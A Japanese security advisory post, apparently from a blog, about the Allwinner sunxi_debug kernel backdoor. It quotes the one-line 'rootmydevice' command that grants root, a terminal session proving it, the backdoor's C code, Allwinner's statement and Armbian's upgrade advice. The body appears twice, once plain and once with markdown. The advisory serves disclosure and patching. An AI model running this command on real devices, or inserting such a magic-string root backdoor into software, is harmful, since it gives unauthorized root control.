{"context": "\u3053\u306e\u30d0\u30c3\u30af\u30c9\u30a2\u304c\u3042\u308b\u3068\u3001\u3069\u306e\u30d7\u30ed\u30bb\u30b9\u3067\u3082\u3001\u3069\u306eUID\u3067\u3082/proc\u306b\u30a2\u30af\u30bb\u30b9\u6a29\u3055\u3048\u3042\u308c\u3070echo \"rootmydevice\" > /proc/sunxi_debug/sunxi_debug\u3068\u3044\u3046\u30b3\u30de\u30f3\u30c9\u3092\u5b9f\u884c\u3059\u308b\u3053\u3068\u3067\u3001root\u30e6\u30fc\u30b6\u30fc\u306b\u306a\u308c\u308b\u3088\u3046\u3067\u3059\u3002\u3064\u307e\u308a\u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u4e0a\u306b\u516c\u958b\u3057\u3066\u3044\u308b\u30b5\u30fc\u30d3\u30b9\u3067\u6761\u4ef6\u3092\u6e80\u305f\u3057\u3066\u3044\u308c\u3070\u3001\u30ea\u30e2\u30fc\u30c8\u304b\u3089root\u3067\u30b3\u30de\u30f3\u30c9\u3092\u5b9f\u884c\u3067\u304d\u308b\u53ef\u80fd\u6027\u304c\u3042\u308b\u3068\u3044\u3046\u3053\u3068\u306b\u3082\u306a\u308a\u307e\u3059\u3002\u78ba\u8a8d\u65b9\u6cd5\u306f\u3053\u3061\u3089(\u4ee5\u4e0b\u629c\u7c8b):\ntk@bananapim3:~$ id\nuid=1000(tk) gid=1000(tk) groups=1000(tk),20(dialout),27(sudo),29(audio),44(video),46(plugdev),108(netdev)\ntk@bananapim3:~$ echo \"rootmydevice\" > /proc/sunxi_debug/sunxi_debug \ntk@bananapim3:~$ id\nuid=0(root) gid=0(root) groups=0(root),20(dialout),27(sudo),29(audio),44(video),46(plugdev),108(netdev),1000(tk)\n\n\u554f\u984c\u306e\u30b3\u30fc\u30c9\u306f\u3053\u3061\u3089(\u4ee5\u4e0b\u629c\u7c8b):\n        if(!strncmp(\"rootmydevice\",(char*)buf,12)){\n                cred = (struct cred *)__task_cred(current);\n                cred->uid = 0;\n                cred->gid = 0;\n                cred->suid = 0;\n                cred->euid = 0;\n                cred->euid = 0;\n                cred->egid = 0;\n                cred->fsuid = 0;\n                cred->fsgid = 0;\n                printk(\"now you are root\\n\");\n        }\n\n\u3053\u306e\u30b3\u30fc\u30c9\u3092\u4f5c\u3063\u305fAllwinner\u306e\u30b3\u30e1\u30f3\u30c8\u306f\u3053\u3061\u3089(\u4ee5\u4e0b\u629c\u7c8b):\n\nAllwinner Technology committed to resolving Linux Kernel software issue\nZhuhai, China - Allwinner Technology.Co.Ltd (SHE: CN:300458) is working with its device manufacturers to fix a current software issue. We are aware that code, which was supplied to device manufacturers for the purpose of developing products, should have been removed prior to shipping. We recommend that anyone who is concerned about this issue should contact the relevant device manufacturer.\nIn relation to the source code on Github, it is released for the open source community only and not for shipping certain devices. Since a debugging function is not needed it has subsequently been removed.\nAllwinner is committed to producing quality SoC\u2019s with security a key priority. We are currently working hard to address this issue and revising our current processes so we can continue to evolve our range of SoC\u2019s in the future.\n\napt-get update/upgrade\u3067\u5bfe\u5fdc\u3067\u304d\u308b\u3068\u306e\u3053\u3068\u306a\u306e\u3067\u3001\u5bfe\u5fdc\u304c\u5fc5\u8981\u306a\u65b9\u306f\u304a\u65e9\u3081\u306b\u3002\n\nthe fix is also in Armbian's apt repo so please upgrade now (apt-get update/upgrade or start with a fresh OS image) if you're affected!\n-- Armbian - Security Alert for Allwinner sun8i (H3/A83T/H8)\u3088\u308a\n\n\u3053\u306e\u30d0\u30c3\u30af\u30c9\u30a2\u304c\u3042\u308b\u3068\u3001\u3069\u306e\u30d7\u30ed\u30bb\u30b9\u3067\u3082\u3001\u3069\u306eUID\u3067\u3082`/proc`\u306b\u30a2\u30af\u30bb\u30b9\u6a29\u3055\u3048\u3042\u308c\u3070`echo \"rootmydevice\" > /proc/sunxi_debug/sunxi_debug`\u3068\u3044\u3046\u30b3\u30de\u30f3\u30c9\u3092\u5b9f\u884c\u3059\u308b\u3053\u3068\u3067\u3001root\u30e6\u30fc\u30b6\u30fc\u306b\u306a\u308c\u308b\u3088\u3046\u3067\u3059\u3002\u3064\u307e\u308a\u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u4e0a\u306b\u516c\u958b\u3057\u3066\u3044\u308b\u30b5\u30fc\u30d3\u30b9\u3067\u6761\u4ef6\u3092\u6e80\u305f\u3057\u3066\u3044\u308c\u3070\u3001\u30ea\u30e2\u30fc\u30c8\u304b\u3089root\u3067\u30b3\u30de\u30f3\u30c9\u3092\u5b9f\u884c\u3067\u304d\u308b\u53ef\u80fd\u6027\u304c\u3042\u308b\u3068\u3044\u3046\u3053\u3068\u306b\u3082\u306a\u308a\u307e\u3059\u3002\u78ba\u8a8d\u65b9\u6cd5\u306f[\u3053\u3061\u3089](https://github.com/friendlyarm/h3_lichee/issues/1)(\u4ee5\u4e0b\u629c\u7c8b):\n\n```\ntk@bananapim3:~$ id\nuid=1000(tk) gid=1000(tk) groups=1000(tk),20(dialout),27(sudo),29(audio),44(video),46(plugdev),108(netdev)\ntk@bananapim3:~$ echo \"rootmydevice\" > /proc/sunxi_debug/sunxi_debug \ntk@bananapim3:~$ id\nuid=0(root) gid=0(root) groups=0(root),20(dialout),27(sudo),29(audio),44(video),46(plugdev),108(netdev),1000(tk)\n```\n\n\u554f\u984c\u306e\u30b3\u30fc\u30c9\u306f[\u3053\u3061\u3089](https://github.com/allwinner-zh/linux-3.4-sunxi/blob/55599b8209bb7150140e4d45ef460dbff6c876dd/arch/arm/mach-sunxi/sunxi-debug.c#L41-L52)(\u4ee5\u4e0b\u629c\u7c8b):\n\n```\n        if(!strncmp(\"rootmydevice\",(char*)buf,12)){\n                cred = (struct cred *)__task_cred(current);\n                cred->uid = 0;\n                cred->gid = 0;\n                cred->suid = 0;\n                cred->euid = 0;\n                cred->euid = 0;\n                cred->egid = 0;\n                cred->fsuid = 0;\n                cred->fsgid = 0;\n                printk(\"now you are root\\n\");\n        }\n```\n\n\u3053\u306e\u30b3\u30fc\u30c9\u3092\u4f5c\u3063\u305fAllwinner\u306e\u30b3\u30e1\u30f3\u30c8\u306f[\u3053\u3061\u3089](https://github.com/allwinner-zh/linux-3.4-sunxi/issues/17)(\u4ee5\u4e0b\u629c\u7c8b):\n\n>Allwinner Technology committed to resolving Linux Kernel software issue\n>\n>Zhuhai, China - Allwinner Technology.Co.Ltd (SHE: CN:300458) is working with its device manufacturers to fix a current software issue. We are aware that code, which was supplied to device manufacturers for the purpose of developing products, should have been removed prior to shipping. We recommend that anyone who is concerned about this issue should contact the relevant device manufacturer.\n>\n>In relation to the source code on Github, it is released for the open source community only and not for shipping certain devices. Since a debugging function is not needed it has subsequently been removed.\n>\n>Allwinner is committed to producing quality SoC\u2019s with security a key priority. We are currently working hard to address this issue and revising our current processes so we can continue to evolve our range of SoC\u2019s in the future.\n\napt-get update/upgrade\u3067\u5bfe\u5fdc\u3067\u304d\u308b\u3068\u306e\u3053\u3068\u306a\u306e\u3067\u3001\u5bfe\u5fdc\u304c\u5fc5\u8981\u306a\u65b9\u306f\u304a\u65e9\u3081\u306b\u3002\n\n>  the fix is also in Armbian's apt repo so please upgrade now (apt-get update/upgrade or start with a fresh OS image) if you're affected!\n> -- [Armbian - Security Alert for Allwinner sun8i (H3/A83T/H8)](http://forum.armbian.com/index.php/topic/1108-security-alert-for-allwinner-sun8i-h3a83th8/http://forum.armbian.com/index.php/topic/1108-security-alert-for-allwinner-sun8i-h3a83th8/%27)\u3088\u308a\n", "tags": ["ARM", "Armbian", "BananaPi", "\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3"]}